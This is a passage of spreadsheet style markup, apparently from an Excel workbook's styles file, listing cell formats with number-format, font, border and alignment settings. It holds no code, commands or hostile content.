    <xf numFmtId="0" fontId="26" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="175" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="176" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="0" borderId="11" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="19" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="49" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="166" fontId="18" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="2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vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="19" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="19" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="0" borderId="9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18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="19" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="19" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="49" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="1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 shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="28" fillId="0" borderId="0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shrinkToFit="1"/>
    </xf>
    <xf numFmtId="58" fontId="19" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="27" fillId="0" borderId="0" pivotButton="0" quotePrefix="0" xfId="0"/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7" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="49" fontId="18" fillId="0" borderId="9" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="49" fontId="18" fillId="0" borderId="12" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="49" fontId="19" fillId="0" borderId="9" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="12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8" fillId="0" borderId="8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left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="49" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="49" fontId="18" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="13" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="19" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="5" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="123">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="123">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="11" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="176" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="19" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="19" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="176" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="125">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="11" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="11" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="125">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="49" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="29" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="6">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="26" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="6">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="26" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="49" fontId="19" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="23" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="166" fontId="2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 shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="23" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="2" fillId="0" borderId="7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/>
    </xf>
    <xf numFmtId="0" fontId="23" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="168" fontId="18" fillId="0" borderId="7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right" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="123">
      <alignment horizontal="center" vertical="center" wrapText="1" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="9" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" wrapText="1" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="27" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" wrapText="1" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="27" fillId="0" borderId="7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 shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="27" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="171" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" wrapText="1" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="176" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="1">
      <alignment horizontal="right" vertical="center" wrapText="1" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="176" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="1">
      <alignment horizontal="right" vertical="center" wrapText="1" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="27" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="1">
      <alignment horizontal="center" vertical="center" wrapText="1" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="170" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="27" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="27" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="2" fillId="0" borderId="7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176" fontId="23" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="24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right" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="5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left" vertical="center"/>
    </xf>
    <xf numFmtId="166" fontId="23" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="166" fontId="23" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="5" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" wrapText="1" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="5" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="125">
      <alignment horizontal="center" vertical="center" wrapText="1" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="27" fillId="0" borderId="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 shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="11" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="125">
      <alignment horizontal="center" vertical="center" wrapText="1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/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="8" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="26" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="6">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="49" fontId="19" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="26" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="29" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="6">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="26" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="6">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="23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166" fontId="18" fillId="0" borderId="8" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="19" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="12" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="24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 shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" wrapText="1" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="19" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" wrapText="1" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="24" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="176" fontId="24" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center"/>
    </xf>
    <xf numFmtId="166" fontId="19" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="19" fillId="0" borderId="8" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="5" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="125">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="11" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="125">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="166" fontId="18" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="29" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="29" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="6">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="29" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="49" fontId="18" fillId="0" borderId="7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right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="23" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="170" fontId="18" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="176" fontId="18" fillId="0" borderId="11" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="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shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="29" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="6">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="23" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="26" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="6">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="6">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="29" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="6">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="13" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="49" fontId="18" fillId="0" borderId="13" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="49" fontId="18" fillId="0" borderId="13" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="13" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="49" fontId="18" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="0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 shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="11" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="5" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="170" fontId="23" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="170" fontId="18" fillId="0" borderId="0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 wrapText="1" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="170" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="49" fontId="18" fillId="0" borderId="11" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="49" fontId="23" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="49" fontId="18" fillId="0" borderId="11" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center" shrinkToFit="1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124">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="124">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="176" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="124">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="10" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="23" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="49" fontId="19" fillId="0" borderId="7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 shrinkToFit="1"/>
    </xf>
    <xf numFmtId="170" fontId="18" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18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49" fontId="18" fillId="8" borderId="9" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center" shrinkToFit="1" indent="2"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="26" fillId="0" borderId="13" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="177" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="173" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="23" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="49" fontId="18" fillId="0" borderId="0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 shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="24" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="177" fontId="18" fillId="0" borderId="7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left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="49" fontId="18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vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="175" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="178" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="172" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="173" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="165" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="165" fontId="19" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="165" fontId="19" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="165" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="165" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="165" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="165" fontId="18" fillId="0" borderId="9" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="165" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="26" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
